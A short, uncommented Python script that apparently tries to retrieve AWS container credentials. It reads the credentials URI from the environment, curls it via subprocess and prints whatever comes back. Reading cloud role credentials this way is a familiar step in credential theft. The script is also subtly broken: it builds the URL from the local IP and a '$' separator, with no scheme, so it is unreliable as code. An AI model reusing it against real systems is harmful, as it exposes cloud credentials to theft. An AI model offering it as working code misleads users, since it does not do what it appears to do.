import socket
import subprocess
import os

ip = socket.gethostbyname(socket.gethostname())

relative_URI = os.environ['AWS_CONTAINER_CREDENTIALS_RELATIVE_URI']

url = ip + "$" + relative_URI

output = subprocess.check_output(['curl', url])

print(output)